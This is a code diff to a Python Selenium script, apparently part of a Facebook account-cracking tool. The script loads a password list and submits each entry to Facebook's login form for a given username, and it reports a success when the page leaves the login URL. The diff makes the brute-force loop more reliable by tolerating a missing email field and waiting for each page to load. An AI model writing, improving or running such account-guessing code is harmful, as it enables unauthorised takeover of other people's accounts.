@@ -1,5 +1,5 @@
 import time
-
+from selenium.common.exceptions import NoSuchElementException
 
 class Facebook:
 
@@ -39,16 +39,20 @@ class Facebook:
                 passwords.append(line.strip('\n'))
         for password in passwords:
             self.browser.driver.get(self.url)
-            email = self.browser.driver.find_element_by_id('email')
-            email.send_keys(self.username)
+            try:
+                email = self.browser.driver.find_element_by_id('email')
+                email.send_keys(self.username)
+            except NoSuchElementException:
+                pass
             pwd = self.browser.driver.find_element_by_id('pass')
             pwd.send_keys(password)
-
             form = self.browser.driver.find_element_by_id('login_form')
             form.submit()
 
+            self.browser.wait_page_loaded()
+
             url = self.browser.driver.current_url
-            if (url != self.url) and ('login_attempt' not in url):
+            if (url != self.url) and ('login_attempt' not in url): 
                 found = password
                 break
             time.sleep(self.delay)
